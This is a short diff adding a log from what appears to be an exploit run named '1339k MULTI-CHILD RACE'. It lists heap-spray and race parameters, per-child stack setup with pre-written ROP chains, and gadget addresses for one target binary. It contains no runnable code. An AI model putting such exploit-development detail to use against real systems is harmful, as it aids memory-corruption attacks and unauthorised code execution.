@@ -1,0 +1,8 @@
+=== 1339k MULTI-CHILD RACE ===
+pid=325
+ebase=44B0000
+params: FREE=1 USE=20 TOTAL=21 TRIALS=200 SPRAY=128 STACK=1000
+stacks: base=310C4C000 total=15000 (21 children x 1000)
+  chains pre-written for 21 children
+  chain[0] verified OK
+gadgets: pop_rax=44B0992 pop_rdi=4579DFE pop_rsi=44BD77D pop_rdx=48602D7 pop_rcx=44B0E64 fn=81979CB57
